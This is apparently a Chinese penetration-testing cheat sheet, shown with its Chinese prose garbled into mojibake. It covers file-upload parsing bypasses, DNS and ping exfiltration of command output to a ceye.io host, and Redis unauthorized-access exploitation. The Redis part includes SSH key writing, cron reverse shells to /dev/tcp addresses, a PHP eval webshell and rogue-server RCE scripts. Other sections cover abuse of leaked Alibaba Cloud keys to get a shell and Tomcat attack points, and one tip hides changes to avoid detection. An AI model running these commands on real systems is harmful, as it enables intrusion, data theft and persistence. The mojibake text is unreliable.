å¦‚ä¸Šä¼ "test.asp:1.jpg"æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªåä¸º"test.asp"çš„ç©ºæ–‡ä»¶ï¼ŒåŸç†æ˜¯åˆ©ç”¨Windowsçš„NTFSå¯æ›¿ä»£æ•°æ®æµçš„ç‰¹æ€§ã€‚å¦å¤–ï¼Œ

":"æˆªæ–­æ“ä½œæ˜¯ä¼˜å…ˆçº§é«˜äºä¼šæŠ¥é”™çš„å­—ç¬¦(0x00é™¤å¤–)çš„ï¼Œä¼šå…ˆæˆªæ–­ï¼Œåªè¦æŠ¥é”™å­—ç¬¦åœ¨":"åé¢ï¼Œç³»ç»Ÿæ˜¯ä¸ä¼šæŠ¥é”™çš„ã€‚
 å¦‚æœ":"æ˜¯æ–‡ä»¶åçš„æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œåˆ™ä¸ä¼šæˆªæ–­ï¼Œä¼šæŠ¥é”™
 ä¸€ä¸ªæ–‡ä»¶åä¸­å¦‚æœåŒ…å«1ä¸ªä»¥ä¸Šçš„":"å·ï¼Œä¹Ÿæ˜¯ä¼šæŠ¥é”™



**::$DATAç»•è¿‡**

windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡





**nginxç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´**

åœ¨fast-cgiå…³é—­çš„æƒ…å†µä¸‹ï¼Œnginxç‰ˆæœ¬:0.5.*, 0.6.*, 0.7- 0.7.65, 0.8 -0.8.37ï¼Œnginxåœ¨å›¾ç‰‡åé™„åŠ phpä»£ç ç„¶åé€šè¿‡è®¿é—®

```css
xx.jpg%00.php
```



**IIS 7.0&7.5ç•¸å½¢è§£ææ¼æ´å’Œnginxç•¸å½¢è§£ææ¼æ´**

é»˜è®¤fast-cgiå¼€å¯çŠ¶å†µä¸‹ï¼Œåœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„åé¢åŠ ä¸Š/xx.phpä¼šå°†åŸæ¥çš„æ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶

ä¸Šä¼ test.jpgï¼Œç„¶åè®¿é—®test.jpg/.phpæˆ–test.jpg/abc.phpå½“å‰ç›®å½•ä¸‹å°±ä¼šè§£æä¸ºphp



**iis6ç•¸å½¢ç›®å½•è§£ææ¼æ´**

åŸå› æ˜¯webåº”ç”¨ç¨‹åºå’ŒIISå¯¹åŒä¸€æ–‡ä»¶çš„æ–‡ä»¶åç§°ï¼ˆç±»å‹ï¼‰ç†è§£ä¸ä¸€è‡´é€ æˆçš„

1. ç•¸å½¢ç›®å½•è§£æ
    /xxxx.asp/xxx.jpg
    å³.aspç»“å°¾çš„ç›®å½•ä¸‹é¢ï¼Œè€Œè¢«IISå½“æˆå¯æ‰§è¡Œæ–‡ä»¶æ¥è§£æ
2. åˆ†å·æ–‡ä»¶è§£æ
    test.asp;.jpg



**Apacheæ–‡ä»¶åè§£æ**

Apacheå¯¹æ–‡ä»¶çš„è§£æåä¸æ˜¯ä»…ä»…è®¤è¯†æœ€åä¸€ä¸ªåç¼€åï¼Œè€Œæ˜¯ä»å³å‘å·¦ï¼Œä¾æ¬¡è¯†åˆ«ï¼Œç›´åˆ°é‡åˆ°è‡ªå·±èƒ½è§£æçš„æ–‡ä»¶åä¸ºæ­¢

.php.sfds.sfsdf.wewfgw.gwegw

åªè®¤è¯†phpå°±è§£æä¸ºphp



**Apacheæ¢è¡Œè§£ææ¼æ´ ï¼ˆCVE-2017-15715ï¼‰**

å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æ

ä¸Šä¼ webshell,ç„¶ååœ¨1.phpåé¢æ’å…¥ä¸€ä¸ª\x0Aæ¢è¡Œ



**nginxæ–‡ä»¶åé€»è¾‘æ¼æ´(CVE-2013-4547)** 

å—å½±å“çš„nginxç‰ˆæœ¬: 0.8.41è‡³1.4.3å’Œ1.5.7ä¹‹å‰çš„1.5.x

æ­£å¸¸ä¸Šä¼ ä¸€ä¸ªé™„åŠ ä»£ç çš„å›¾ç‰‡"test.jpg"ï¼Œè®¿é—®æ—¶åé¢+"ç©ºæ ¼"+"\0"+".php" å³è®©å›¾ç‰‡ä½œä¸ºphpæ–‡ä»¶è§£æ

(ä¸èƒ½ç¼–ç ,burpæ”¹åŒ…,æŠŠç¬¬äºŒä¸ªç©ºæ ¼æ”¹ä¸º00)

```bash
"/test.jpg  .php"
/test.jpg[0x20][0x00].php
```



**bypass waf**

å®‰å…¨ç‹—çš„ç»•è¿‡ï¼Œå¸¸æœ‰ä¸‹åˆ—ä¸‰ç§æ–¹æ³•

ã€€ã€€ã€€ã€€a). ===ç»•è¿‡

ã€€ã€€ã€€ã€€ã€€ã€€Content-Disposition ï¼š from-dataï¼› name="upload" ; filename==="microfan.php"

ã€€ã€€ã€€ã€€b). å»é™¤""ç»•è¿‡

ã€€ã€€ã€€ã€€ã€€ã€€Content-Disposition ï¼š from-dataï¼› name="upload" ; filename=microfan.php

ã€€ã€€ã€€ã€€c). å°‘"ç»•è¿‡

ã€€ã€€ã€€ã€€ã€€ã€€Content-Disposition ï¼š from-dataï¼› name="upload" ; filename="microfan.php



## å‘½ä»¤æ‰§è¡Œ

### ç»“æœå¤–å¸¦

**Windows**

åœ¨windowså½“ä¸­ï¼Œ%cd% ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œæˆ‘ä»¬é€šè¿‡echoå°†å½“å‰ç›®å½•å†™å…¥æ–‡æœ¬temp,ç„¶åè£å›½certutilå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œbase64ç¼–ç ï¼Œå†è¿‡æ»¤certutilæºå¸¦çš„å­—ç¬¦ï¼Œå°†å®ƒèµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œæœ€åé€šè¿‡nslookupå¤–å¸¦å‡ºæ¥ï¼Œä»è€Œå®ç°è·å–å½“å‰ç›®å½•çš„ç›®çš„ã€‚

```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
```

ä¸‹é¢è¿™ä¸ªè¯­å¥ï¼Œä¸»è¦æ˜¯è¿‡æ»¤ä½œç”¨ã€‚æŠŠhelo.txtæ–‡ä»¶ä¸­çš„â€œ=â€è¿‡æ»¤å¹¶é‡æ–°è¾“å‡ºæ–‡ä»¶ã€‚

```
for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
```

ä¸ºä»€ä¹ˆåœ¨ä¸Šé¢éœ€è¦è¿‡æ»¤=ï¼Œä¸»è¦æ˜¯å› ä¸ºåœ¨æ‰§è¡Œpingå‘½ä»¤çš„æ—¶å€™æ˜¯ä¸å…è®¸å¸¦=å·çš„ï¼Œç›¸è¾ƒäºnslookupï¼Œpingå‘½ä»¤æˆåŠŸç‡ç›¸å¯¹è¾ƒé«˜ï¼Œä½†å¦‚æœè·¯å¾„è¿‡é•¿ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¤±è´¥ã€‚å…·ä½“å¤šé•¿éœ€è¦å¤§å®¶è‡ªè¡Œè¯•éªŒã€‚

```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
```

å¦‚æœéœ€è¦å¤–å¸¦å¤šè¡Œå‘½ä»¤ï¼Œåˆ™éœ€è¦ä»¥ä¸‹è¯­å¥ï¼š

```
where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
```

**ï¼ˆbï¼‰Linux**

åœ¨linuxä¸­pwdä¹Ÿæ˜¯æŸ¥çœ‹å½“å‰ç›®å½•çš„ï¼Œæˆ‘ä»¬é€šè¿‡tr -då°†æ¢è¡Œç¬¦å»æ‰å¹¶é€šè¿‡xxd -pså°†å€¼è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å³å¯å¤–å¸¦å‡ºè‡ªå·±æƒ³è¦çš„ä¸œè¥¿ã€‚

```
ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
```

base64åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸»è¦æ˜¯å¯¹å€¼è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæ›¿æ¢æ‰â€œ=â€ï¼Œå³å¯æˆåŠŸå¤–å¸¦æ•°æ®ã€‚

```
pingpwd|base64|tr -d â€˜=â€™.is1lv6.ceye.io
```

å¦‚æœæœ‰å¤šè¡Œæ•°æ®éœ€è¦å¤–å¸¦ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘ä¸‹é¢çš„è¯­å¥ã€‚ï¼ˆå’Œå¤§ä½¬å­¦çš„ï¼‰

```
var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
```

oobä¸»è¦å‚è€ƒä¸€ä½å¤§ä½¬æ–‡ç« ï¼Œä¼šåœ¨æ–‡æœ«åˆ—å‡ºã€‚





## æœªæˆæƒæ¼æ´

### redis

å‚è€ƒ:https://www.cnblogs.com/twosmi1e/p/13308682.html

https://www.cnblogs.com/loopkep/p/11135949.html

#### **å¸¸ç”¨å‘½ä»¤**

```
      set testkey "Hello World"  # è®¾ç½®é”®testkeyçš„å€¼ä¸ºå­—ç¬¦ä¸²Hello World
      get testkey                       # è·å–é”®testkeyçš„å†…å®¹
      SET score 99                      # è®¾ç½®é”®scoreçš„å€¼ä¸º99
      INCR score                        # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1
      GET score                         # è·å–é”®scoreçš„å†…å®¹
      keys *                            # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®
      get anotherkey                    # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼
      config set dir /home/test         # è®¾ç½®å·¥ä½œç›®å½•,Redisäº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶å°†æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹
      config set dbfilename redis.rdb   # è®¾ç½®å¤‡ä»½æ–‡ä»¶å
      config get dir                    # æ£€æŸ¥å·¥ä½œç›®å½•æ˜¯å¦è®¾ç½®æˆåŠŸ
      config get dbfilename             # æ£€æŸ¥å¤‡ä»½æ–‡ä»¶åæ˜¯å¦è®¾ç½®æˆåŠŸ
      save                              # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œ
      flushall åˆ é™¤æ‰€æœ‰æ•°æ®
      del key åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®
```

1. ä½¿ç”¨SETå’ŒGETå‘½ä»¤ï¼Œå¯ä»¥å®ŒæˆåŸºæœ¬çš„èµ‹å€¼å’Œå–å€¼æ“ä½œï¼›
2. Redisæ˜¯ä¸åŒºåˆ†å‘½ä»¤çš„å¤§å°å†™çš„ï¼Œsetå’ŒSETæ˜¯åŒä¸€ä¸ªæ„æ€ï¼›
3. ä½¿ç”¨keys *å¯ä»¥åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ï¼›
4. å½“å°è¯•è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼æ—¶ï¼ŒRedisä¼šè¿”å›ç©ºï¼Œå³(nil)ï¼›
5. å¦‚æœé”®çš„å€¼ä¸­æœ‰ç©ºæ ¼ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚"Hello World"ï¼›

#### **åˆ©ç”¨**

##### å†™ssh-keygenç™»å½•

åˆ©ç”¨æ¡ä»¶

1. rootè´¦å·å¯åŠ¨redisæœåŠ¡
2. æœåŠ¡å™¨å¼€æ”¾SSHæœåŠ¡ï¼Œå…è®¸å¯†é’¥ç™»å½•ã€‚

1. æ”»å‡»æœºä¸Šç”Ÿæˆå…¬ç§é’¥
   ![img](img/2059787-20200715224555141-1298892077.png)
2. æœªæˆæƒè®¿é—®redis
   ![img](img/2059787-20200715224603427-816508208.png)
3. åˆ©ç”¨redisçš„æ•°æ®å¤‡ä»½åŠŸèƒ½ä¿®æ”¹å¤‡ä»½ç›®å½•ä¸º /redis/.ssh/ å¤‡ä»½æ–‡ä»¶åä¸º authorized_keys
   ![img](img/2059787-20200715224612696-1520388092.png)
4. å†™å…¥é”®å€¼
   ![img](img/2059787-20200715224623093-986828475.png)
5. sshè¿æ¥
   ![img](img/2059787-20200715224628816-465374735.png)

åˆ©ç”¨äºŒ

```
>ssh-keygen -t rsa
>(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > qq.txt
>cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit
>redis-cli -h 127.0.0.1
6379> config set dir /root/.ssh/
6379> config set dbfilename "authorized_keys"
6379> save
```



##### å†™è®¡åˆ’ä»»åŠ¡åå¼¹shell

å®šæ—¶ä»»åŠ¡ä½ç½®ä½äºæ–‡ä»¶ï¼š/var/spool/cron/ç”¨æˆ·å

**åŸç†**

/var/spool/cron/ç›®å½•ä¸‹å­˜æ”¾çš„ä¸ºä»¥å„ä¸ªç”¨æˆ·å‘½åçš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶ï¼Œrootç”¨æˆ·å¯ä»¥ä¿®æ”¹ä»»æ„ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ã€‚dbfilenameè®¾ç½®ä¸ºrootä¸ºç”¨rootç”¨æˆ·æƒé™æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚

**æ‰§è¡Œå‘½ä»¤åå¼¹shell(å†™è®¡åˆ’ä»»åŠ¡æ—¶ä¼šè¦†ç›–åŸæ¥å­˜åœ¨çš„ç”¨æˆ·è®¡åˆ’ä»»åŠ¡).å†™æ–‡ä»¶ä¹‹å‰å…ˆè·å–dirå’Œdbfilenameçš„å€¼ï¼Œä»¥ä¾¿æ¢å¤redisé…ç½®ï¼Œå°†æ”¹åŠ¨é™åˆ°æœ€ä½ï¼Œé¿å…è¢«å‘ç°**ã€‚

**åˆ©ç”¨æ¡ä»¶**

redisæ˜¯rootç”¨æˆ·å¯åŠ¨

**å‘ï¼šcrontabåå¼¹debian,ubuntuéƒ½ä¸è¡Œ**ï¼Œå› ä¸ºä»–ä»¬å¯¹è®¡åˆ’ä»»åŠ¡çš„æ ¼å¼å¾ˆä¸¥æ ¼ï¼Œå¿…é¡»è¦æ‰§è¡Œ
`crontab -u root /var/spool/cron/crontabs/root`
é€šè¿‡è¯­æ³•æ£€æŸ¥åï¼Œæ‰èƒ½æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚

æ‰§è¡Œ

```
#è·å–dirçš„å€¼
config get dir
#è·å–dbfilenameçš„å€¼
config get dbfilename
#è®¾ç½®æ•°æ®åº“å¤‡ä»½ç›®å½•ä¸ºlinuxè®¡åˆ’ä»»åŠ¡ç›®å½•
config set dir '/var/spool/cron/'
#è®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºrootï¼Œä»¥rootèº«ä»½æ‰§è¡Œè®¡åˆ’ä»»åŠ¡
config set dbfilename 'root'
#åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰key
flushall
#è®¾ç½®å†™å…¥çš„å†…å®¹ï¼Œåœ¨è®¡åˆ’ä»»åŠ¡å‰ååŠ å…¥æ¢è¡Œä»¥ç¡®ä¿å†™å…¥çš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«æ­£å¸¸è§£æï¼Œæ­¤å¤„å¯ä»¥ç›´æ¥è°ƒç”¨luaè¯­å¥ã€‚
eval "redis.call('set','cron',string.char(10)..ARGV[1]..string.char(10))" 0 '*/1 * * * * bash -i >& /dev/tcp/10.10.19.29/8080 0>&1'
#ä¿å­˜
save
#åˆ é™¤æ–°å¢çš„key
del cron
#æ¢å¤dirå’Œdbfilename
config set dir '***'
config set dbfilename '***'
```

åˆ©ç”¨

```
redis 192.168.242.134:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.242.131/888 0>&1\n"
redis 192.168.242.134:6379> config set dir /var/spool/cron/
redis 192.168.242.134:6379> config set dbfilename root
redis 192.168.242.134:6379> save
```

#####  å†™webshell

åˆ©ç”¨æ¡ä»¶

1. å·²çŸ¥webçš„ç»å¯¹è·¯å¾„
2. å…·æœ‰è¯»å†™æƒé™

```
redis-cli -h 192.168.1.154
config set dir /var/www/html 
set xxx "\n\n\n<?php@eval($_POST['c']);?>\n\n\n" 
config set dbfilename webshell.php 
save
```

#####  åˆ©ç”¨ä¸»ä»å¤åˆ¶è·å–shell

åˆ©ç”¨è„šæœ¬1

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make
git clone https://github.com/Ridter/redis-rce
python redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so
```

è„šæœ¬2

```
https://github.com/vulhub/redis-rogue-getshell
éœ€è¦python3.0ä»¥ä¸Š
ç¼–è¯‘
>cd RedisModulesSDK/
>make
ä¼šåœ¨æ­¤ç›®å½•ä¸‹ç”Ÿæˆexp.so
æ‰§è¡Œå‘½ä»¤
>python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c "cat /etc/passwd"

https://github.com/n0b0dyCN/redis-rogue-server
éœ€è¦python3.6ä»¥ä¸Š
ç¼–è¯‘
>cd RedisModulesSDK/exp
>make
æ‰§è¡Œ
>./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108
```





ç›¸å…³åˆ©ç”¨å·¥å…·

https://github.com/00theway/redis_exp

https://github.com/r35tart/RedisWriteFile

##### å…¶ä»–å§¿åŠ¿

Windowsä¸‹å¦‚ä½•getshellï¼Ÿ

- å†™å…¥webshellï¼Œéœ€è¦çŸ¥é“webè·¯å¾„
- å†™å…¥å¯åŠ¨é¡¹ï¼Œéœ€è¦ç›®æ ‡æœåŠ¡å™¨é‡å¯
- ç³»ç»ŸdllåŠ«æŒ
- è¦†ç›–è½¯ä»¶æˆ–è€…ä¸­é—´ä»¶é…ç½®æ–‡ä»¶
- è¦†ç›–å¿«æ·æ–¹å¼
- è¦†ç›–ç²˜æ»é”®,æ”¾å¤§é•œ
- å†™å…¥MOFï¼ŒMOFæ¯éš”5ç§’é’Ÿä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œé€‚ç”¨äºWindows2003ã€‚

å®æˆ˜åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ç”¨è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šé—®é¢˜çš„

1. redisæ•°æ®é‡ç¨å¾®å¤§ä¸€ç‚¹ï¼Œå†™shellåˆ°æ–‡ä»¶ä¹‹åï¼Œphpå› ä¸ºæ–‡ä»¶å¤ªå¤§æ˜¯ä¼šæ‹’ç»æ‰§è¡Œçš„
2. Ubuntuï¼ŒDebianå†™è®¡åˆ’ä»»åŠ¡åå¼¹æ— ç”¨
3. å†™/etc/passwdä¼šè¦†ç›–åŸæœ‰/etc/passwdï¼Œä¸å¯èƒ½æ”¹äº†å†æ”¹å›æ¥
4. ç”Ÿäº§ç¯å¢ƒä¸‹ç”¨`KEY *` è¿™æ ·çš„å‘½ä»¤ç›´æ¥ç‚¸







## æ•æ„Ÿä¿¡æ¯æ³„æ¼åˆ©ç”¨



### é˜¿é‡Œäº‘Access Keyåˆ©ç”¨

é¦–å…ˆç”¨è¡Œäº‘ç®¡å®¶å¯¼å…¥äº‘ä¸»æœºï¼Œç½‘ç«™åœ°å€ï¼šhttps://yun.cloudbility.com/

æ­¥éª¤ï¼šé€‰æ‹©é˜¿é‡Œäº‘ä¸»æœº -> å¯¼å…¥key idè·Ÿkey secret -> é€‰æ‹©ä¸»æœº -> å¯¼å…¥å³å¯ï¼ˆåå­—éšä¾¿è¾“ï¼‰

æˆ‘ä»¬ç”¨è¿™ä¸ªåªæ˜¯ä¸ºäº†å¾—åˆ°ä¸¤ä¸ªæ•°æ®ï¼Œå°±æ˜¯**å®ä¾‹IDä»¥åŠæ‰€å±ç½‘ç»œ**ï¼Œæ‹¿åˆ°å°±å¯ä»¥èµ°äººäº†.

è¿™é‡Œæˆ‘ä»¬æ‰“å¼€é˜¿é‡ŒAPIç®¡ç†å™¨ï¼Œè¿™ä¸ªæ˜¯é˜¿é‡Œæä¾›ç»™è¿ç»´å¼€å‘äººå‘˜ä½¿ç”¨çš„ä¸€ä¸ªå·¥å…·ï¼Œ

https://api.aliyun.com/#/?product=Ecs

ç‚¹å‡»å·¦è¾¹çš„æœç´ æ¡†è¾“å…¥commandï¼Œæˆ‘ä»¬ä¼šç”¨åˆ°CreateCommandè·ŸInvokeCommandï¼ŒCreateCommandæ˜¯åˆ›å»ºå‘½ä»¤ï¼ŒInvokeCommandæ˜¯è°ƒç”¨å‘½ä»¤ã€‚ç»§ç»­å¾€ä¸‹çœ‹

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribSc1yXehrLAgMEv9p7DyEFfuSru0zW7YlA50JjAtIEibWVHYEGo0qtJVnQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

 

Nameéƒ¨åˆ†éšæ„

TypeæŒ‡çš„æ˜¯æ‰§è¡Œè„šæœ¬ç±»å‹

  RunBatScriptï¼šåˆ›å»ºä¸€ä¸ªåœ¨Windowså®ä¾‹ä¸­è¿è¡Œçš„ Bat è„šæœ¬ã€‚

  RunPowerShellScriptï¼šåˆ›å»ºä¸€ä¸ªåœ¨Windowså®ä¾‹ä¸­è¿è¡Œçš„PowerShellè„šæœ¬ã€‚

  RunShellScriptï¼šåˆ›å»ºä¸€ä¸ªåœ¨Linuxå®ä¾‹ä¸­è¿è¡Œçš„Shellè„šæœ¬ã€‚

CommandContentä¸ºæ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œæ˜¯å¡«å†™base64ç¼–ç ã€‚

å¡«å†™å®Œåé€‰æ‹©python

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScFLYCmT0CO5KSxJSZNa8LJATJc0jC4cRkPHjuCoUr4pDUib44HRQUDUA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

ç‚¹å‡»**è°ƒè¯•SDKç¤ºä¾‹ä»£ç **ï¼Œæ­¤æ—¶ä¼šå¼¹å‡ºCloud shellçª—å£ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªCreateCommand.pyæ–‡ä»¶ï¼Œç”¨vimç¼–è¾‘å™¨æ‰“å¼€CreateCommand.pyï¼Œä¿®æ”¹accessKeyIdä¸accessSecretã€‚

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScqAeuZ8UumNuZqwSyLhMkWBibHpQbEINQKYY7yHqNYOMFyqrlnmTgu9Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScoM4GVJbBWJJfaJTNgHFNuEqZSgkrdicOwr5HRxBkwo2ffNNXM2LLKoQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



æ‰§è¡ŒCreateCommand.pyï¼Œä¼šè¿”å›ä¸€ä¸ªRequestIdä¸CommandIdï¼Œè®°å½•CommandIdï¼Œåé¢è°ƒç”¨å‘½ä»¤ä¼šç”¨åˆ°ã€‚

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScBE7czOcxicKZuXHIpRicVgicRAibTmDK5oGhjZTXQtqibV3iatJjDGWPD2mQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



æ‰“å¼€InvokeCommand

RegionIdå¡«å†™è¡Œäº‘ç®¡å®¶ä¸­çš„æ‰€å±ç½‘ç»œ

CommandIdå¡«å†™åˆšåˆšæ‰§è¡ŒCreateCommand.pyè¿”å›çš„CommandId

InstanceIdå¡«å†™ç¤ºä¾‹IDï¼Œè¡Œäº‘ç®¡å®¶ä¸­è·å–åˆ°çš„é‚£ä¸ª

ç»§ç»­ç‚¹å‡»**è°ƒè¯•SDKä»£ç **ï¼Œä¼šç”Ÿæˆä¸€ä¸ªInvokeCommand.pyæ–‡ä»¶ï¼ŒåŒæ ·ç”¨vimç¼–è¾‘å™¨æŠŠaccessKeyIdä¸accessSecretä¿®æ”¹äº†ã€‚

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScfCqYTQiaFqlLrnG8ntYaecWnZZwBJqDLHeC7cBHopSxFdhibqObyVhdw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

ä¿®æ”¹å®Œæˆåä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œæ‰§è¡ŒInvokeCommand.pyã€‚

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScWV8vIzqkd7OGnQH4xszFoHurKCiagO5vGxQLMeq2jBA6KMeaFBWseJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

æˆåŠŸæ‰§è¡Œå‘½ä»¤åå¼¹shellï¼Œæ”¶å·¥ã€‚

#### alicloudåˆ©ç”¨å·¥å…·

https://github.com/iiiusky/alicloud-tools



 

## ä¸­é—´ä»¶å®‰å…¨



### tomcatå®‰å…¨

å‚è€ƒ:https://www.anquanke.com/post/id/223002 ä¸å®‰å…¨çš„ä¸­é—´ä»¶â€”â€”Tomcat



**è‡ªå¸¦çš„é»˜è®¤åº”ç”¨**

1. examplesç›®å½•

   1. ä¿¡æ¯æ³„æ¼
   2. /examples/servlets/servlet/SessionExample å…è®¸ç”¨æˆ·å¯¹sessionè¿›è¡Œæ“çºµ(è€ç³»ç»Ÿå¯èƒ½å‡ºç°)

2. adminç®¡ç†é¡µé¢

   1. Tomcat 5.0.4ç‰ˆæœ¬ä¹‹å‰éƒ½æ˜¯é»˜è®¤å®‰è£…,.5.0.4ä¹‹åç‰ˆæœ¬é»˜è®¤å­˜åœ¨è¯¥ç›®å½•ï¼Œä½†æ˜¯åŠŸèƒ½å¹¶ä¸å…¨

      1. é»˜è®¤è·¯å¾„ä¸º/admin
      2. tomcat-user.xmlæ–‡ä»¶ä¸­è¿›è¡Œè´¦å·å¯†ç çš„é…ç½®
      3. åŠŸèƒ½å’Œmanagerä¸‹é¢çš„å·®ä¸å¤š

   2. managerç®¡ç†é¡µé¢

      1. æœ€å¸¸è§çš„,åŸºæœ¬tomcaté»˜è®¤éƒ½æœ‰
      2. é»˜è®¤æ²¡æœ‰è®¾ç½®ç™»å½•å£ä»¤,éœ€è¦tomcat-user.xmlæ–‡ä»¶ä¸­è¿›è¡Œè´¦å·å¯†ç çš„é…ç½®
      3. ç™»å½•ä½¿ç”¨çš„Basicè®¤è¯æ–¹å¼(è¯·æ±‚å¤´é‡Œé¢çš„Authorizationä¸ºbase64ç¼–ç ,å¯ä»¥ç”¨burpçˆ†ç ´)
      4. Tomcat manageråŒ…å«4ä¸ªä¸åŒçš„è§’è‰²ï¼š
         - manager-guiï¼šå…è®¸è®¿é—®htmlé¡µé¢æ¥å£(å³URLè·¯å¾„ä¸º/manager/html/*)
         - manager-scriptï¼šå…è®¸è®¿é—®çº¯æ–‡æœ¬æ¥å£(å³URLè·¯å¾„ä¸º/manager/text/*)
         - manager-jmxï¼šå…è®¸è®¿é—®JMXä»£ç†æ¥å£(å³URLè·¯å¾„ä¸º/manager/jmxproxy/*)
         - manager-statusï¼šå…è®¸è®¿é—®Tomcatåªè¯»çŠ¶æ€é¡µé¢(å³URLè·¯å¾„ä¸º/manager/status/*)
      5. éƒ¨ç½²waråŒ…æ‹¿shell

   3. AJPåè®®

      1. æ¯”è¾ƒé¸¡è‚‹
      2. ç›®å‰çˆ†å‡ºçš„å¯ç›´æ¥åˆ©ç”¨çš„å°±æ˜¯CVE-2020-1938ï¼ˆAJPæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰

   4. debugæ¨¡å¼

      1. é»˜è®¤ä¸å¼€å¯
      2. è°ƒè¯•ç«¯å£8000,æŒ‡çº¹jdwp
      3. ä½ç‰ˆæœ¬çš„jdkä¸­ä¼šå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥é€šè¿‡jdwpæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤

   5. CVE-2016-8735ååºåˆ—åŒ–

      1. æ¡ä»¶:é…ç½®JMXåšç›‘æ§æ—¶ä½¿ç”¨äº†JmxRemoteLifecycleListener
      2. ysoserialæ¥è¿›è¡Œæ¼æ´æ”»å‡»åˆ©ç”¨

